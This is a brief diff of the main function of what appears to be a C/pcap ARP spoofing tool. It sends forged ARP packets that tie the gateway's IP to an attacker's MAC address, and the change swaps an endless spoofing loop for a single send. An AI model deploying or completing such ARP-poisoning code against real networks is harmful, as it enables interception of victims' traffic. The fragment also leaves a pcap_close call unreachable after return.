@@ -45,10 +45,7 @@ int main(int argc, char *argv[])
 	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, victim_ip, 0);
 	reply(dev, pcap, victim_mac);
 	print_mac(victim_mac);
-	while (1)
-	{
-		request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
-	}
+	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
 	return 0;
 	pcap_close(pcap);
 }
